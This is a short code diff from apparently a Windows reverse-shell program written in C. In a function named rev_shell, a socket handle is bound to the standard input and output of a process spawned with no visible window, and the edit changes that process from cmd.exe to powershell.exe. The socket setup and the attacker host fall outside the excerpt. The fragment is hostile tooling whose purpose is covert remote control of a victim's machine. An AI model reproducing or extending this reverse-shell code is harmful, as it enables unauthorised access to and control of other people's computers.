@@ -97,7 +97,7 @@ void rev_shell() {
         sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
         //Using CreateProcess API to spawn cmd
         //NULL, Process to Spawn, NULL, NULL, BOOLEAN, DWORD INT, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
-        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+        CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
         //Startup Process
         WaitForSingleObject(pinfo.hProcess, INFINITE);
         CloseHandle(pinfo.hProcess);
